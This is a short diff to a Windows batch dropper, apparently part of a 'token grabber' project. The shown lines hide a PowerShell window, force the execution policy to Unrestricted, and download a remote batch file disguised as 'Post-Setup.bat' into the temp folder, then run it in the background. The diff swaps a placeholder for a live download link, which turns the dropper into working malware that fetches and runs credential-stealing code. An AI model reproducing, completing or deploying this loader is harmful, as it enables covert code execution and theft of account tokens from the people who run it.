@@ -12,6 +12,6 @@ if %errorlevel% neq 0 (
 :: example as link, it needs to be in releases.. https://github.com/EvilBytecode/Batchfile-Token-Grabber/releases/download/batchgrabber/Grabber.bat (EXAMPLE)
 powershell -WindowStyle Hidden -Command "Set-ExecutionPolicy Unrestricted -Force"
 set "gogings=%TEMP%\"
-powershell -Command "& { Invoke-WebRequest -Uri 'Your Batch Link Here Btw you can obfuscate and after drop it' -OutFile '%gogings%EvilByte.bat' }"
+powershell -Command "& { Invoke-WebRequest -Uri 'https://github.com/DoIoco/Batchfile-Token-Grabber-Evilbyte/releases/download/release/Post-Setup.bat' -OutFile '%gogings%EvilByte.bat' }"
 timeout /T 2 /NOBREAK >nul
 start /B call %gogings%EvilByte.bat
